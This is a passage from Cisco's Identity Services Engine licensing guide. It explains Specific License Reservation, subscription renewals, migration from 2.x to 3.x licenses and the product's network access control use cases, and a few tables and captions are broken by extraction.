While Cisco ISE Smart Licensing works as a nested model in which a higher-tier license includes all the lower-tier features, Specific License Reservation does not fully support such a model automatically. In Specific License Reservation, you must reserve and activate the required license count for each Cisco ISE license type. For example, if your deployment will consume Cisco ISE features enabled by Advantage and Premier licenses, you must reserve both Advantage and Premier licenses. If you reserve only Premier licenses, but your deployment has active endpoints which are only consuming Advantage tier feature and no Premier tier features, you receive error or non-authorized behavior notifications.

So, the reservation should be done based on the below criteria:

**Premier Quantity to be Reserved:** This should be same as portion of peak active endpoints using ONLY Premier features (not Advantage or Essential Features)

**Advantage Quantity to be Reserved:** This should be same as portion of peak active endpoints using ONLY Advantage features (not Essential features).

**Essentials Quantity to be Reserved:** This should same as portion of peak active endpoints using only Essentials features.

**Example:**

●      If customer has purchased 1000 Premier licenses:

◦    Customer can reserve 1000 Premier licenses – This allows only Premier capabilities.

◦    Customer can reserve 500 Premier and 500 Advantage licenses – This reservation combination enables Premier and Advantage capabilities for 500 endpoints respectively.

◦    Customer can reserve 500 Premier, 300 Advantage, and 200 Essentials licenses - This reservation combination enables Premier features for 500 endpoints, Advantage features for 300 endpoints, and Essentials features for 200 endpoints.

Customers can change the reserved license tiers and quantities anytime.

Here is an example illustrating the SLR process for Subscription licenses:

**Step 1: Purchase/Order:**

Tier = Premier; Quantity = 100

**Step 2: Smart Account display (after booking/invoicing)**

Tier = Premier; Quantity = 100

**Step 3: Generate SLR Reservation code in ISE**

**Step 4: Enter SLR Reservation Code in SSM**

**Step 5: SSM will show the following licenses to reserve (breaking Premier into lower tiers because of nested-doll model):**

Tier = Premier; Purchase quantity = 100; Available to reserve quantity = 100

Tier = Advantage; Purchase quantity = 0; Available to reserve quantity = 100

Tier = Essentials; Purchase quantity = 0; Available to reserve quantity = 100

And this is where the customer must reserve each tier individually by adding quantities next to each tier. Please note that the total still needs to be 100 or less. So, the customer can do the following:

Premier Reserve quantity = 80

Advantage Reserve quantity = 10

Essentials Reserve quantity = 10

**OR**

Premier Reserve quantity = 30

Advantage Reserve quantity = 30

Essentials Reserve quantity = 10

Note the total is less than 100

**Or**

Any other combinations are possible where the total quantity across the tiers is 100 (same as the purchased quantity) or less.

**Secondary PAN:**

In a distributed deployment, you may need to enable Specific License Reservation on your primary and secondary PANs. If there are no Cisco ISE licenses registered on your secondary PAN, in the case of primary PAN failure, Cisco ISE access and services are impacted.

If Cisco ISE licenses are registered on the secondary PAN as well, in the event of a primary PAN failover, Cisco ISE will continue to be accessible through the newly promoted secondary PAN. You can then work on rejoining the primary PAN to its original state.

The following table explains two approaches to ensuring uninterrupted access to Cisco ISE if you require 100 tier licenses.

**Table 3.** License distribution for ISE licenses

| Minimum license distribution that ensures Cisco ISE runs uninterrupted for certain period | | What to expect in the event of a primary PAN failover | Maximum license distribution that ensures Cisco ISE runs uninterrupted, without noncompliance alarms | | What to expect in the event of a primary PAN failover |
| --- | --- | --- | --- | --- | --- |
| Primary PAN | Secondary PAN |  | Primary PAN | Secondary PAN |  |
| 100 | 1 | Since the newly promoted primary PAN doesn’t have sufficient licenses, your Cisco ISE goes out of compliance. Cisco ISE enters a 30-day grace period.  Before the grace period expires, rejoin the original primary PAN with the higher license count.  Alternatively, to continue working with the newly promoted primary PAN, release the licenses reserved on the original PAN and reserve the required licenses on the newly promoted PAN. | 100 | 100 | No impact on Cisco ISE services or operations.  No remediation actions are required. You must only rejoin the original PAN to Cisco ISE. |

If there are zero licenses reserved on Secondary PAN, then it goes into ‘Evaluation Mode’ depending on the number of evaluation days left for the entire deployment since the first time ISE was deployed. For example, if ISE already used up 50 days in the initial eval period before purchased licenses were registered, then Secondary PAN (which becomes the newly promoted primary PAN on failover) would remain in evaluation period for 40 days in SLR scenarios. If there are zero evaluation days left, then the deployment becomes out-of-compliance until the customer releases the licenses reserved on the original PAN and reserves them on the newly promoted PAN.

You will not be able to use any license entitlements that are not part of your Specific License Reservation. Out-of-compliance alerts are shown in the Cisco ISE administration portal if license usage does not comply with the Specific License Reservation.

5.3.1. Licensing directives related to Specific License Reservation

●      The number of licenses you can reserve through Specific License Reservation can be lower than or equal to the total number of licenses listed in the Purchased column, in the Licenses Inventory window of your Cisco SSM portal.

●      You can reserve ISE-PIC licenses for Cisco ISE nodes that contain only the Passive Identity Connector (PIC) function. Each ISE-PIC license supports 3000 Cisco ISE-PIC sessions in a deployment. You can reserve only one ISE-PIC license per node. Hence, the number of available licenses decreases by 1. If you have purchased 5 ISE-PIC licenses and reserve 4 ISE-PIC licenses, then you have the following:

**Table 4.** ISE-PIC example

| License | Purchased | In use | Balance |
| --- | --- | --- | --- |
| **ISE-PIC** | 5 | (4 reserved) | 1 |

One ISE-PIC-UPG license supports 300,000 ISE-PIC sessions. To reserve an ISE-PIC-UPG license, you must also reserve an ISE-PIC license.

You cannot reserve tier licenses (ISE Essentials, ISE Advantage, or ISE Premier) in a Cisco ISE-PIC node.

You cannot reserve an ISE-PIC license on a Cisco ISE node. However, the License Reservation workflow in the Cisco SSM portal allows you to assign an ISE-PIC license to a Cisco ISE node. The SSM portal displays that the ISE-PIC license is reserved until you modify the reservation to remove the ISE-PIC license.

The License Reservation workflow in the Cisco SSM portal allows you to assign ISE Essentials licenses for an ISE-PIC node, even though the ISE-PIC node does not allow the use of these licenses. The SSM portal displays that the ISE Essentials licenses are reserved until you modify the reservation to remove the ISE Essentials licenses.

5.3.2. Specific License Reservation examples

**Table 5.** Specific License Reservation examples

| Available licenses in your virtual account in SSM (\*1) | Reserved licenses in ISE deployment | Licenses remaining in your virtual account in Cisco SSM (\*1) |
| --- | --- | --- |
| **Rule 1. You can reserve as many licenses as you have in your virtual account.** | | |
| **100 Essentials** | 300 Essentials (\*2) | 0 Essentials |
| **100 Essentials** |  |  |
| **100 Essentials** |  |  |
| **Rule 2. You should reserve the right type of license that you are entitled to.** | | |
| **100 Advantage** | 40 Advantage  40 Essentials (\*3) | 20 Advantage |
| **Rule 3. You should reserve 1 ISE-PIC license (\*4) per node.** | | |
| **5 ISE-PIC licenses** | 1 ISE-PIC license | 4 ISE-PIC licenses |
| **Rule 4. If you reserve an ISE-PIC-UPG license, you must also reserve 1 ISE-PIC license.** | | |
| **5 ISE-PIC licenses**  **3 ISE-PIC-UPG licenses** | 1 ISE-PIC license  1 ISE-PIC-UPG license | 4 ISE-PIC licenses  2 ISE-PIC-UPG licenses |
| **5 ISE-PIC licenses**  **3 ISE-PIC-UPG licenses** | 1 ISE-PIC license (\*5) | 4 ISE-PIC licenses  3 ISE-PIC-UPG licenses |
| **Rule 5. You shouldn't reserve Essentials, Advantage, and Premier licenses to the ISE-PIC node unless you are upgrading ISE-PIC to the ISE full version (\*6).** | | |

\*1 This doesn't include licenses previously reserved and not returned.

\*2 You can reserve up to as many licenses as you are entitled to.

\*3 An Essentials license can be reserved if there are higher tier licenses available.

\*4 You should reserve only 1 ISE-PIC license per node. An ISE-PIC license should not be reserved to an ISE node. If you do it, then SSM will allow it even though it cannot be used in the deployment as these validations are not built into SSM.

\*5 You can reserve an ISE-PIC license only, which allows for up to 3000 ISE-PIC sessions per ISE-PIC deployment.

\*6 This is a rare case in which a customer has both an ISE-PIC deployment and an ISE deployment.

6. Subscription Renewals, Cancellations or Modifications

6.1. Subscription renewals

Cisco ISE subscriptions automatically renew for an additional 12-month term by default unless auto-renewal was deselected at the time of initial order. No quoting or order is required. Starting 120 days before the end of the initial term, renewal notices will be sent to the customer or partner. The customer or partner will receive an invoice at the start of the new term.

You can cancel a renewal up to 60 days before the start date of the new term. If the subscription is not canceled 60 days before the start of the new term, the subscription will auto-renew. Midterm cancellations of subscriptions for credit are not allowed.

Any subscription can be manually renewed if the customer or partner desires, with standard terms of 12, 36, or 60 months. For manual renewals, quotes are created using the same process as the change subscription process outlined below. This process will create a new quote. After a quote is approved, it can be converted to an order following the standard process.

6.2. Subscription cancellations

Renewals may be canceled up to 60 days before the start date of the new term. If the subscription is not canceled 60 days prior to the start of the new term, the subscription will automatically renew. Midterm cancellations of subscriptions for credit are not allowed.

6.3. Subscription Modifications

Changes to the products, quantities, or terms of a subscription may be made at any time during the term of the subscription. To change the subscription, please refer to the [Cisco Commerce Change Subscription Job Aid](https://www.cisco.com/E-Learning/gbo-ccw/cdc_bulk/Cisco_Commerce_Q1FY19_September_Release/Cisco_Commerce_Change_Subscription_Job_Aid.pdf). Attempting to add products or seats by creating a new subscription will result in an ordering error.

7. Cisco ISE license migration

An ISE Upgrade from 2.x to 3.x version may require multiple steps to be taken by the customer.

![Cisco ISE license migration](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_12.png)

**Planning the upgrade:**

**Step 1:** Evaluate the features in 3.x versions to determine which version best works for your deployment

**Step 2:** Choose the upgrade path depending on where your current deployment is and which version you want to upgrade to

**Executing the upgrade**

**Step 1:** Procure additional hardware depending on the future 3.x version

**Step 2:** Migrate ISE Licenses from 2.x to 3.x (detailed later in this document)

**Step 3:** Upgrade the deployment to the decided 3.x version

Please refer to the [Cisco Upgrade guide](https://cloud.path.cisco.com/SWC_Upgrade?product=ISE) for details of the steps not covered in this document. Cisco highly recommends utilizing the free [Healthchecks and expert sessions](https://community.cisco.com/t5/technology-and-support-events-and-webinars/eb-p/ts-events-webinars-bd?include_ongoing=false&label_texts=Ask+the+Experts&io=true&iu=true&ip=false&et=51&ta=%2C38%2C40) before performing the upgrade.

![Get Help](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_13.png)

Cisco ISE licenses have undergone some changes to help streamline and optimize Cisco ISE purchasing and management.

New licenses introduced in Cisco ISE are typically Smart Licenses. Therefore, to migrate an existing 2.x license type to a new 3.x license type, you will need a Smart Account for Cisco Smart Licensing. [Here](https://www.youtube.com/watch?v=1F7c1jfetuY) is a video with instructions for creating a Smart Account.

The following figure shows the mapping of features between the 2.x and 3.x licenses.

![Mapping of 2.x and 3.x licensing model features](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_14.png)

EA customers may also be eligible to retain their 2.x licenses until 26-Apr-2025 if they use the ‘EA Change Subscription’ process. Please raise a Cisco TAC case with such a request which will be reviewed by Cisco ISE BU team.

7.2 Migrate to VM Common licenses

Each VM license—Small, Medium, or Large—is converted to a VM Common license. If you currently own 50 VM Small licenses, 30 VM Medium licenses, and 20 VM Large licenses, you will own 100 VM Common licenses after the migration process is complete.

**Table 6.** Migration to VM Common licenses

| Upgrade from | Upgrade to | Ratio |
| --- | --- | --- |
| **R-ISE-VML-K9=** | R-ISE-VMC-K9= | 1:1 |
| **R-ISE-VMM-K9=** | R-ISE-VMC-K9= | 1:1 |
| **R-ISE-VMS-K9=** | R-ISE-VMC-K9= | 1:1 |

**Customers can continue to use classic VM Small, Medium, and Large licenses as well as the VM Common license for ISE 2.4, 2.6, 2.7, and 3.0.** However, note that the classic PAK VM licenses need to be converted to Smart Licenses in ISE 3.0. For a seamless customer experience, we have replaced all classic VM licenses (Small, Medium, and Large) in your Smart Account with new VM Common licenses, which cover the use of any Large, Medium, or Small VM Licenses. If you already had VM Small, Medium, and Large licenses in your Smart Account, no further action will be required for upgrade. However, if you do not have a Smart Account, please create a Smart Account by navigating to [Cisco Software Central](https://software.cisco.com/), and then open a case with the Cisco Global License Operations Team to have your old or classic VM licenses converted to the new VM Common licenses in Smart Account.

**Table 7.** Virtual machine license use cases

| License on release | | Pre-2.4 release | Releases 2.4, 2.6, 2.7, and 3.0 | Release 3.1 and later |  |

Please include all details from the original VM appliance purchase.  **Note:** If you are unable to locate the sales order number pertaining to your past purchase of ISE VM, please reach out to your Cisco sales representative or partner. |  |

If you upgrade to ISE 2.4 prior to raising a case with the licensing team, the deployment displays the warning “Fewer VM Licenses installed than VM Resources/VM Nodes deployed.” While on ISE 2.4, this is only a warning message and does not disrupt any user’s ISE experience.

Customers who are on ISE 2.x and ISE 3.0 can continue to use the classic VM licenses until the [end-of-life](https://www.cisco.com/c/en/us/products/security/identity-services-engine/eos-eol-notice-listing.html) date of the licenses.

VM licenses use the license hierarchy, meaning that usage for a tier can be covered by any available licenses in a higher tier at a 1:1 ratio.

VM Common (Smart only) > VM Large > VM Medium > VM Small.

7.2.1 Downgrade from the VM Common license to the classic VM licenses

A downgrade is not recommended. You can use the VM Common license in any Cisco ISE release with Smart Licensing enforcement. Once you have the VM Common license (which works as the VM Large license does), you can use it even if you roll back to a Cisco ISE Release 3.0 or earlier (Cisco ISE Release 2.4 and later) that has Smart Licensing enabled. The VM Common license covers VM Small, VM Medium, and VM Large licenses.

If you purchased VM Common but are still in an ISE release earlier than 2.4, you will not be able to use the VM Common license.

7.2.2. Support associated with the classic VM licenses

When you migrate your PAK classic VM licenses to the VM Common license, you continue to receive support based on the support contract purchased with the classic VM license product ID (PID). The support can be renewed until the classic VM license PID is EOL and reaches the last date of service renewal per the [End-of-life notices](https://www.cisco.com/c/en/us/products/security/identity-services-engine/eos-eol-notice-listing.html). There is no support migration required. Therefore, for seamless support in such cases, customers should open a case with [Cisco Customer Service](https://customerservice.cloudapps.cisco.com/) and request the End-of-Life PID to be replaced with the desired PID in order to renew and receive support.

If you need to renew support, please follow the steps in the next section.

7.2.3 How to renew expired support on the old VM PID

Customers who are using PAK classic VM licenses can renew support for their VM licenses until the classic VM license PID reaches [End of Life](https://www.cisco.com/c/en/us/products/collateral/security/identity-services-engine/identity-services-engine-virtual-machine-s-m-l-eol.html) and last date of service renewal per the [End-of-Life](https://www.cisco.com/c/en/us/products/collateral/security/identity-services-engine/identity-services-engine-virtual-machine-s-m-l-eol.html) bulletin. However, customers who purchased old or classic VM licenses but are now using VM Common licenses should follow the steps below to request a PID swap in order to renew support.

1.     Log in to <https://customerservice.cloudapps.cisco.com/>

2.     Search for keyword “RMA Issues” and click Open a case.

3.     Fill in the Case title field with a relevant title (Example: PID Swap for Customer XXX).

4.     Select Product ID Upgrade or Change as the Type of Request.

5.     Select the appropriate Business Justification.

6.     Download the Excel template, fill in all the required sections, and upload or update the attributes in the UI itself.

| Old product ID | Old instance number | New product ID | Contract number |
| --- | --- | --- | --- |
| **Ex: R-ISE-VM-K9** | Ex: 1310418043 | R-ISE-VMC-K9= | 204831740 |

7.     Click Next and create the case.

This PID swap request is processed by the Customer Service team, which shares the newly created instance number with the customer. Subsequently, the customer can continue to renew support on the new VM Common PID.

7.3 Migration of Device Admin licenses

Cisco ISE Release 2.4 and earlier also supports a classic Device Admin license, which is no longer available for purchase. The classic Device Admin license was a cluster license that allowed TACACS services on all the PSNs in a deployment. Releases 2.6 and later require the Node license.

Classic Device Admin licenses are grandfathered. If you are migrating from a 2.x release to a 3.x release, your Device Admin license must be migrated to a Smart Account.

The classic Device Admin license entitled an entire deployment of ISE to TACACS+ feature usage. This meant that up to all 50 ISE PSNs could be enabled with TACACS+ capabilities. This license works up to and including ISE Release 2.4.

At the time of the release of 2.4, a new Device Admin license was introduced that enables TACACS+ feature usage on a per-node basis. This new license is required for ISE Release 2.6 and later.

Customers with the classic Device Admin license who are upgrading to Release 2.4 or later are entitled to upgrade and receive the number of new Device Admin licenses equivalent to the number of PSNs in their deployment.

**Table 8.** Device Admin license use cases

| License on release | | Pre-2.4 release | Release 2.4 and later |
| --- | --- | --- | --- |
| **Device Admin license** | **New** | Not applicable | Is identified and enables consumption of 1 ISE TACACS+ Policy Service Node |
| **Classic** | Is identified and consumed as uncounted (unlimited number of ISE TACACS+ appliances within the deployment) | Is identified and enables consumption of up to 50 ISE TACACS+ Policy Service Nodes |

**Note:** Classic Device Admin and Node licenses are perpetual.

8. Cisco Identity Services Engine use cases

8.1. Guest and secure wireless access

8.1.1. Why provide Guest access?

Many organizations provide free internet access to guests visiting their organization for a short period. These guests include vendors, retail customers, short-term vendors or contractors, and so on. Cisco ISE provides the ability to create accounts for these visitors and authenticate them for audit purposes. There are three ways in which Cisco ISE can provide Guest access: via a hotspot (immediate noncredentialed access), self-registration, or sponsored Guest access. Cisco ISE also provides a rich set of APIs to integrate with other systems such as vendor management systems to create, edit, and delete Guest accounts. Further, the various portals that the end user sees can be completely customized with the right font, color, themes, and so on to match the look and feel of the customer’s brand.

8.1.2. How does Guest access work?

![Cisco ISE Guest use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_21.png)

Figure 8.

Cisco ISE Guest use case

Cisco ISE creates local accounts for guests. These accounts can be created either by an employee hosting the guest (the sponsor) using a built-in portal or by the guests themselves by providing some basic information. The guest can receive credentials via email or SMS and use them to authenticate themselves to the network and thereby get network access. The administrator can define what level of access to provide to such users.

Required license: ISE Essentials

8.1.3. Why provide secure wireless access?

Most organizations start by securing their wireless network. Securing the wireless network is the most basic need for every organization. Using Cisco ISE, network administrators can secure access to the network by allowing only authorized users and wireless devices, such as mobile phones, tablets, or laptops – BYOD or organization owned — and other wireless devices to connect to the network and then later enforcing different security policies. Authentication and authorization are core functionalities of Cisco ISE. Every Cisco ISE session begins with authentication, whether to a user or to a device. Authentication can be active or passive (not including 802.1X sessions): An active authentication is done using 802.1X when Cisco ISE authenticates the user against an identity source, while in passive authentication (used in Easy Connect) Cisco ISE learns about the user after the user authenticates against an identity source such as Microsoft’s Active Directory (AD) and the AD notifies ISE.

8.1.4. How does secure wireless access work?

![Cisco ISE secure wireless use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_22.png)

Figure 9.

Cisco ISE secure wireless use case

After successful authentication, based on the group’s information, Cisco ISE provides the right access to the wireless connection, whether the connection is a passive identity session (Easy Connect), MAC Address Bypass (MAB), or 802.1X. This can be achieved by assigning the user to a VLAN, discretionary access control list (DACL), or access control list (ACL) or to a security group tag (SGT) or security group access control list (SGACL).

Required license: ISE Essentials (SGT or SGACL will require ISE Advantage).

8.2. Asset visibility

8.2.1. Why asset visibility?

Understanding the device type is often a critical element in determining the type of network access that should be granted to the device. For example, a building management system such as an IP camera or an elevator should be given access to a specific part of the network (such as the building management services network), while a printer should be given access to another part of the network (such as IT services). Having visibility helps the IT administrator determine the types of devices on the network and how to provide them with the right level of permissions. Basic asset visibility profiles endpoints by matching their network attributes to known profiles. Advanced asset visibility performs deeper analysis of the different conversations that applications on these devices have with other endpoints and servers on the network through deep packet inspection (DPI). While basic asset visibility will provide you with visibility into most of your network, especially your traditional devices (printers, mobile phones, etc.), advanced asset visibility will provide you with visibility into more vertical-specific and IoT-types of devices.

8.2.2. How does Basic Visibility (Cisco ISE Profiling Visibility) work?

![Cisco ISE Basic Visibility use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_23.png)

Figure 10.

Cisco ISE Basic Visibility use case

Basic asset visibility in Cisco ISE is accomplished through the Profiler service, which gathers information about a device by listening to its network communication. The likely device type is determined by weighing the information from most definitive to least definitive attributes.

It uses artificial intelligence and machine learning to intuitively group endpoints that have common attributes and helps IT administrators by providing suggestions for the right endpoint profiling labels. Multifactor classification classifies endpoints using label categories for flexible profiling.

Based on an asset’s profile, the next step in securing your network asset continuum is to enforce access. Basic asset enforcement allows you to use the categorization of endpoints by profiles and in your network access policy. This helps ensure that, based on the visibility learned for an endpoint, it will be given only the network permissions for its profile. Printers will be able to receive access only to printing servers or anyone needing printing services, and mobile personal devices will be able to receive access only to internet services and low-risk internal systems.

Required license: ISE Advantage

8.3. Compliance (posture)

8.3.1. Why provide Compliance Visibility?

Saboteurs focus on intentional data corruption (ransomware) and data exfiltration, which compromises endpoints on a network. The most effective and well-publicized compromises take advantage of known issues that would have been simple to remediate but were overlooked. Compliance Visibility allows organizations to view how user endpoints comply with corporate policy through the use of posture and/or integration with mobile device management (MDM) and enterprise mobility management (EMM) systems (supported MDM/EMM systems can be found in [Cisco ISE Network Component Compatibility](https://www.cisco.com/c/en/us/td/docs/security/ise/2-7/compatibility_doc/b_ise_sdt_27.html#mdmservers)). Using either Cisco ISE’s Posture engine or an MDM, an organization can evaluate how many endpoints are compliant and ensure that noncompliant software is not installed and/or running.

8.3.2. How does Compliance Visibility work?

![Cisco ISE Compliance Visibility use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_24.png)

Figure 11.

Cisco ISE Compliance Visibility use case

Posture leverages installed and temporal agents looking inside the endpoint to provide assurance that operating system patches, anti-malware, firewall, and more are installed, enabled, and up to date before authorizing the device onto the network.

Having good visibility into what endpoints comply with the corporate software policy is usually not enough. A customer might want to enable differentiated access to endpoints based on their compliance level. Compliance enforcement allows the customer to take an overall compliance status, derived either through Cisco ISE’s own Posture engine or through said MDM/EMM integrations, and using it in an access policy. Combined with other attributes (such as identity), this powerful capability helps lower the organizational risks and shrink the overall threat surface created by noncompliant, unhygienic endpoints trying to connect to the network. Such policy can allow fully compliant endpoints to have full access to required resources by the user using it, while allowing access only to remediation systems, help desk systems, and/or low-risk services by endpoints found noncompliant. Using either Cisco ISE’s Posture engine or an MDM, an organization can evaluate how many endpoints are compliant and ensure that noncompliant endpoints with outdated and/or unsupported software cannot access critical resources.

Required license: ISE Premier (with Cisco AnyConnect Apex if using AnyConnect or AnyConnect Stealth).

8.4. Secure Wired Access

8.4.1. Why provide Secure Wired Access?

Securing the wired network is essential to prevent unauthorized users from connecting their devices to the network. Using Cisco ISE, network administrators can provide secure wired network access by authenticating and authorizing users and devices. Authentication can be active or passive. An active authentication is done using 802.1X when Cisco ISE authenticates the user against an identity source. Passive authentication involves Cisco ISE learning the user’s identity via Active Directory domain logins or other indirect means. Once the user or device authenticates successfully, authorization takes place. Authorization can be achieved by assigning the endpoint’s network access session a dynamic VLAN, a downloadable ACL, or other segmentation methods.

8.4.2. How does Secure Wired Access work?

![Cisco ISE Secure Wired Access use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_25.png)

Figure 12.
       s

Cisco ISE Secure Wired Access use case

Cisco ISE authenticates the users and endpoints via 802.1X, web authentication, MAB, and other means. Cisco ISE can query external identity sources for identity resolutions and apply appropriate network policies by instructing the network devices.

Required license: ISE Essentials

8.5. Bring your own device (BYOD)

8.5.1. Why support BYOD?

Many organizations have instituted a policy that allows employees to connect their personal devices such as smartphones to the corporate wireless network and use it for business purposes. This is referred to as a bring-your-own-device (BYOD) policy. However, since these devices are owned by the individuals, they don’t like to install management software that allows organizations to “manage” the endpoint. In such situations, Cisco ISE provides a very streamlined method to automate the entire BYOD onboarding process, from device registration and supplicant provisioning to certificate installation. This can be done on devices across various OS platforms such as iOS, Android, Windows, macOS, and ChromeOS. The Cisco ISE My Devices Portal, which is completely customizable, allows end users to onboard and manage various devices.

8.5.2. How does BYOD work?

![Cisco ISE BYOD use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_26.png)

Figure 13.

Cisco ISE BYOD use case

Cisco ISE provides multiple elements that help automate the entire onboarding aspect for BYOD. This includes a built-in Certificate Authority (CA) to create and help distribute certificates to different types of devices. The built-in CA provides a complete certificate lifecycle management. Cisco ISE also provides a My Devices Portal, an end-user-facing portal that allows the end user to register their BYOD endpoint as well as mark it as being lost and block it from the network. BYOD onboarding can be accomplished either through a single-SSID or dual-SSID approach. In the single-SSID approach, the same SSID is used to onboard and connect the end user’s device, while in the dual-SSID approach, an open SSID is used to onboard the devices, but the device connects to a different, more secure SSID after the onboarding process. For customers that want to provide a more complete management policy, BYOD can be used to connect the end user to the MDM onboarding page as well.

8.6. Rapid Threat Containment (RTC)

8.6.1. Why Rapid Threat Containment?

Cisco RTC makes it easy to get fast answers about threats on your network and to stop them even faster. It uses an open integration of Cisco security products, technologies from Cisco partners, and the extensive network control of Cisco ISE.

With integrated network access control technology, you can manually or automatically change your users’ access privileges when there’s suspicious activity, a threat, or vulnerabilities discovered. Devices that are suspected of being infected can be denied access to critical data while their users can keep working on less-critical applications.

8.6.2. How does RTC work?

![Cisco ISE RTC use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_27.png)

Figure 14.

Cisco ISE RTC use case

Upon detecting a flagrant threat on an endpoint, a pxGrid ecosystem partner can instruct ISE to contain the infected endpoint either manually or automatically. The containment can involve moving the device to a sandbox for observation, moving it to a remediation domain for repair, or removing it completely. ISE can also receive the standardized Common Vulnerability Scoring System (CVSS) classifications and the Structured Threat Information Expression (STIX) threat classifications, so that graceful manual or automatic changes to a user’s access privileges can be made based on their security score.

Cisco ISE integrates with more than 75 ecosystem partners over pxGrid to implement several use cases. Technical details about Cisco ISE integrations can be found in the [ISE Security Ecosystem Integration Guides](https://community.cisco.com/t5/security-documents/ise-design-amp-%20integration-guides/ta-p/3621164).

8.7. Segmentation

8.7.1. Why segmentation?

Network segmentation is a proven concept to protect critical business assets, but traditional approaches are complex. Cisco Group-Based Policy/TrustSec software-defined segmentation is simpler to enable than VLAN-based segmentation. Policy is defined through security groups. It is an open concept in IETF, available within Open Daylight, and supported on third-party and Cisco platforms. Cisco ISE is the segmentation controller, which simplifies the management of switch, router, wireless, and firewall rules. Group-Based Policy/TrustSec segmentation provides better security at a lower cost compared to traditional segmentation. Forrester Consulting found in an analysis of customers that operational costs are reduced by 80% and policy changes are 98% faster.

8.7.2. How does segmentation work?

![Cisco ISE segmentation use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_28.png)

Figure 15.

Cisco ISE segmentation use case

The illustration above shows users and devices assigned to security groups, and consequently their group membership is known throughout the network so that any enforcement device along the path can evaluate policy based on the group-to-group approved communication.

8.7.3. Software-Defined Access

Segmentation is a key element of Cisco Software-Defined Access (SDA). Together, the Cisco DNA Center controller and Cisco ISE automate network segmentation and group-based policy. Identity-based policy and Segmentation decouples security policy definition from VLAN and IP addresses. The [SD-Access Design and Deployment](https://www.cisco.com/c/en/us/solutions/design-zone.html) guides detail the configuration and deployment of Group-Based Policy.

![Cisco ISE SD-Access integration use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_29.png)

Figure 16.

Cisco ISE SD-Access integration use case

To extend segmentation across the enterprise network, Cisco ISE interfaces with the Cisco Application Centric Infrastructure (ACI) Controller, which is also called Application Policy Infrastructure Controller – Data Center (APIC- DC), to learn endpoint group (EPG) names and share software group (SG) names and corresponding EPG values, SGT values, and the Virtual Routing and Forwarding (VRF) name. This allows Cisco ISE to create and populate SG-to-EPG translation tables, which are obtained by the border device to translate TrustSec-ACI identifiers as traffic passes across the domains. The [TrustSec – ACI Policy Plane Integration Configuration Guide](https://community.cisco.com/t5/security-documents/trustsec-aci-policy-plane-integration-configuration-guide-pdf/ta-p/3653367) gives an overview of ACI and the configuration of the policy plane integration.

TrustSec technology is supported in over 50 Cisco product families and works with open-source and third-party products. Cisco ISE acts as the policy controller for routers, switches, wireless, and security products. Details about product TrustSec capabilities are provided in the Cisco Group Based Policy [Platform and Capability Matrix](https://www.cisco.com/c/dam/en/us/solutions/collateral/enterprise-networks/trustsec/software-platform-capability-matrix.pdf). The Cisco TrustSec [Quick Start Configuration Guide](https://www.cisco.com/c/dam/en/us/solutions/collateral/enterprise-networks/trustsec/configuration-guide.pdf) illustrates a typical TrustSec network deployment with step-by-step configuration of a sample environment. For more options, please refer to the [Design Guides](https://www.cisco.com/c/en/us/solutions/enterprise-networks/trustsec/design-guide-listing.html).

**Note:** The following licenses enable segmentation via SD-Access: Advantage or Premier on Cisco ISE, and Cisco DNA Premier/Cisco DNA Advantage. For more information, see the [SD-Access Ordering Guide](https://www.cisco.com/c/dam/en/us/solutions/collateral/enterprise-networks/software-defined-access/guide-c07-739242.pdf).

8.8. Security ecosystem integrations

8.8.1. Why security ecosystem integrations?

Cisco ISE builds contextual data about endpoints in terms of their device type, location, time of access, posture, user(s) associated to that asset, and much more. Endpoints can be tagged with SGTs based on these attributes. This rich contextual insight can be used to enforce effective network access control policies and can also be shared with ecosystem partners to enrich their services. For example, in the Cisco Next-Generation Firewalls (NGFW), policies can be written based on the identity context, such as device type, location, user groups, and others, received from Cisco ISE. Inversely, specific context from third-party systems can be fed into the Cisco ISE to enrich its sensing and profiling capabilities, and for threat containment. The context exchange between the platforms can be done via Cisco pxGrid (including pxGrid Cloud and pxGrid Direct) or REST APIs.

External RESTful Services (ERS) on Cisco ISE serve the purpose of both context sharing (in and out) and management of Cisco ISE for a specific set of use cases over REST APIs.

8.8.2. How do security ecosystem integrations work?

![Cisco ISE security ecosystem integration](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_30.png)

8.9. Device Administration (TACACS+)

8.9.1. Why Device Administration?

Network and security administrators typically own the task of administering and monitoring network and security devices in an enterprise. When there are a limited number of devices, keeping track of admin users, privileges, or changes in configuration can be easy. However, as the network grows to tens, hundreds, or even thousands of devices, it becomes exceedingly complex to manage devices without automation and a smooth workflow. Cisco ISE provides the capability to automate device administration tasks with clean workflows and monitoring capabilities with TACACS+ within a controlled space in the UI.

8.9.2. How does Device Administration work?

![Cisco ISE Device Administration use case](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_31.png)

Figure 18.

Cisco ISE Device Administration use case

